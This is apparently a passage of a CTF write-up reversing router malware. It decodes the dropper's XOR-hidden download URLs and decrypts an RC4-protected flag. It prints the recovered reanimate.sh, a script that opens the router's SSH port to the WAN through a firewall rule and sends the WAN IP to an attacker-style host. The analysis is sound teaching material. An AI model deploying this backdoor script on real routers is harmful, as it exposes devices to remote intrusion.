  memcpy(v8, dword_400F74, 0x3A);
  memcpy(v9, dword_400FB0, 0x37);
  modify((int)v4);
  modify((int)v6);
  modify((int)v8);
  modify((int)v9);

  if ( access(v4, 0) == 0xFFFFFFFF )
  {
    write2file((int)v8, (int)v4);
    chmod((int)v4, 0x1FF);
  }
  if ( access(v6, 0) == 0xFFFFFFFF )
  {
    write2file((int)v9, (int)v6);
    chmod((int)v6, 0x1FF);
  }
  system((int)v6);
  system((int)v4);
  return 0;
}
```

```c
BOOL __fastcall modify(int a1)
{
  BOOL result; // $v0
  unsigned int i; // [sp+18h] [+18h]

  for ( i = 0; ; ++i )
  {
    result = i < strlen(a1);
    if ( !result )
      break;
    *(_BYTE *)(a1 + i) ^= *((_BYTE *)byte_400F24 + (int)i % 0x20);
  }
  return result;
}
```

I use python to write a script with similar functionality as above.

```python=
def modify(a1):
    key = bytearray(b'\xdf\x11\x02\xeaQ\x80\x91\xcc\r/\xe1+4\x8f\xac\xe3\xa0+\x90^\x03\xa2\xa42\xed\xee\x03\x96\x83W\xf4\xb0')
    i = 0
    while i < len(a1):
        a1[i] ^= key[i % 32]
        i += 1
    return a1

v4 = [0xF0, 0x65, 0x6F, 0x9A, 0x7E, 0xE4, 0xF4, 0xAD, 0x69, 0x70, 0x93, 0x4E, 0x55, 0xE1, 0xC5, 0x8E, 0xC1, 0x5F, 0xF5, 0x3A]
v4 = bytearray(v4)

v5 = 0

v6 = [0xF0, 0x65, 0x6F, 0x9A, 0x7E, 0xF2, 0xF4, 0xAD, 0x63, 0x46, 0x8C, 0x4A, 0x40, 0xEA, 0x82, 0x90]
v6 = bytearray(v6)
v7 = 0xC8

v8 = bytearray(b'\xb7ev\x9ak\xaf\xbe\xafbA\x87BS\xfc\x82\x91\xcf^\xe4;q\x8c\xccF\x8f\xc1g\xf3\xe23\xab\xc2\xbapl\x83<\xe1\xe5\xa9ip\x8ceY\xd5\xf8\xae\xd4e\xfa\x0b0\xfb\xf7\x02\xdd')
v9 = bytearray(b'\xb7ev\x9ak\xaf\xbe\xafbA\x87BS\xfc\x82\x91\xcf^\xe4;q\x8c\xccF\x8f\xc1q\xf3\xe29\x9d\xdd\xbeeg\xc4"\xe8\xce\xa6HU\xae|y\xfb\xf6\xb7\xf5S\xdf\r3\x92')

print(modify(v4), "from ", modify(v8))
print(modify(v6), "from ", modify(v9))
```

Output is:

```plaintext
bytearray(b'/tmp/dead_reanimated') from  bytearray(b'http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00')
bytearray(b'/tmp/reanimate.s') from  bytearray(b'http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00')
```

Having downloaded the two files from that URL, we can continue our analysis.

This is `reanimate.sh` file
```shell
#!/bin/sh

WAN_IP=$(ip -4 -o addr show pppoe-wan | awk '{print $4}' | cut -d "/" -f 1)
# lấy ip của pppoe-wan

ROUTER_IP=$(ip -4 -o addr show br-lan | awk '{print $4}' | cut -d "/" -f 1)

CONFIG="config redirect         \n\t              
	option dest 'lan'           \n\t
	option target 'DNAT'        \n\t 
	option name 'share'         \n\t
	option src 'wan'            \n\t
	option src_dport '61337'    \n\t
	option dest_port '22'       \n\t
	option family 'ipv4'        \n\t
	list proto 'tcpudp'         \n\t
	option dest_ip '${ROUTER_IP}'"

echo -e $CONFIG >> /etc/config/firewall

/etc/init.d/firewall restart

curl -X POST -H "Content-Type: application/json" -b "auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY" -d '{"ip":"'${WAN_IP}'"}' http://configs.router.htb/reanimate
```

The part 1 of flag.
![image](https://hackmd.io/_uploads/r1sJ2piP6.png)


With part 2 in `dead_reanimated` file, we continue to use IDA to reverse.

It uses RC4 to encrypt with key is `d2c0ba035fe58753c648066d76fa793bea92ef29`

```cpp=
#include <iostream>
#include <string>

using namespace std;

void swap(char &a, char &b){
    char meo = a;
    a = b;
    b = meo;
}

int main(){
    int key_rounds[256];
    string key = "d2c0ba035fe58753c648066d76fa793bea92ef29";
    int pt[27] = {0xC5, 0x7C, 0x2B, 0x05, 0x48, 0x90, 0xF3, 0xB7, 0x3F, 0x76, 0x0F, 0x5B, 0x68, 0x7B, 0x62, 0x72, 0xBD, 0xF8, 0x01, 0x9B, 0x57, 0x47, 0x1E, 0x6F, 0xDF, 0x8C, 0x55};
    
    int len = key.size();
    //cout << len << endl;
    for (int i = 0; i < 256; i++){
        key_rounds[i] = i;
    }

    int v8 = 0;
    for (int i = 0; i < 256; i++){
        v8 = (key[i % len] + key_rounds[i] + v8) % 256;
        int v11 = key_rounds[i];
        swap(key_rounds[i], key_rounds[v8]);
    }

    int res[27];
    v8 = 0;
    int v9 = 0;
    for (int i = 0; i < 27; i++){
        v9 = (v9 + 1) & 0xff;
        int v11 = key_rounds[v9];
        v8 = (v11 + v8) & 0xff;
        key_rounds[v9] = key_rounds[v8];
        key_rounds[v8] = v11;
        res[i] = (key_rounds[(v11 + key_rounds[v9]) & 0xff] ^ (int)pt[i]) & 0xff;
    }
    string ret = "";
    for (int i = 0; i < 27; i++){
        ret = ret + (char)(res[i] & 0xff);
    }
    cout << ret;
    return 0;
}

```

Ouput's value is the part 2 of the flag.

# Shadow of the undead

> I can't solve this challenge in the competition. So, after I read another player's write up, I did it myself to learn more 

You can read HTB's write up in there (https://github.com/hackthebox/uni-ctf-2023)





